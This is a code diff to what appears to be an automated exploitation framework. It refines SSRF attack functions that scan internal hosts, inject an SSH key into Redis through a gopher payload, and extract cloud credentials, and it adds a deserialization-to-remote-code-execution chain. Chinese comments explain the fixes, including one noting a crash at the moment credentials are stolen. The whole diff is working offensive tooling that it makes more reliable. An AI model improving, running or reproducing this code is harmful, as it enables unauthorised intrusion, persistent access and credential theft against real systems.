@@ -342,7 +342,7 @@ def _try_ssrf_to_internal_scan(param: str, sess: requests.Session,
         seen.add(test_url)
         try:
             r = sess.get(test_url, timeout=timeout, allow_redirects=False)
-            if r.status_code not in (0,) and r.status_code < 500:
+            if r.status_code < 500 and r.status_code not in (404, 400):
                 result["success"] = True
                 result["evidence"].append({
                     "internal_url": internal_url,
@@ -378,10 +378,12 @@ def _try_ssrf_redis_rce(param: str, sess: requests.Session,
     ) % (len(ssh_pub), requests.utils.quote(ssh_pub, safe=""))
     test_url = base_url.replace(param + "=", param + "=" + redis_payload)
     try:
-        sess.get(test_url, timeout=timeout)
-        result["success"] = True
-        result["evidence"].append("ssh_key_injected_via_redis_gopher")
-        result["method"] = "gopher_redis_ssh"
+        r = sess.get(test_url, timeout=timeout)
+        # 404/5xx 不能算 gopher 执行成功 (旧逻辑任意非异常响应都判 pwned).
+        if r.status_code < 500 and r.status_code != 404:
+            result["success"] = True
+            result["evidence"].append("ssh_key_injected_via_redis_gopher")
+            result["method"] = "gopher_redis_ssh"
     except requests.RequestException as e:
         logger.debug("redis rce: %s", e)
     return result
@@ -539,7 +541,16 @@ def _try_ssrf_cloud_creds_extract(param: str, sess: requests.Session,
             except Exception:
                 continue
 
-    result["credentials"] = list(set(result.get("credentials", [])))
+    # 凭据是 dict 列表, set() 去重会 TypeError (恰在窃到凭据时崩溃);
+    # 按内容键去重.
+    seen_creds = set()
+    uniq_creds = []
+    for c in result.get("credentials", []):
+        key = repr(sorted(c.items())) if isinstance(c, dict) else repr(c)
+        if key not in seen_creds:
+            seen_creds.add(key)
+            uniq_creds.append(c)
+    result["credentials"] = uniq_creds
     return result
 
 
@@ -819,6 +830,16 @@ class ChainEngine:
                     result["steps"].append(redis_res)
                     result["pwned"] = True
         result["success"] = any(s.get("success") for s in result["steps"])
+        return result
+
+    def chain_deser_to_rce(self, url: str, param: str) -> Dict:
+        result = {"chain": "deser_to_rce", "steps": [], "success": False}
+        deser = _try_deser_to_rce(param, self.sess, url, self.timeout)
+        result["steps"].append(deser)
+        if deser["success"]:
+            result["rce_available"] = True
+            result["rce_method"] = deser.get("method", "unknown")
+        result["success"] = deser["success"]
         return result
 
     def chain_debug_abuse(self, url: str, param: Optional[str] = None) -> Dict:
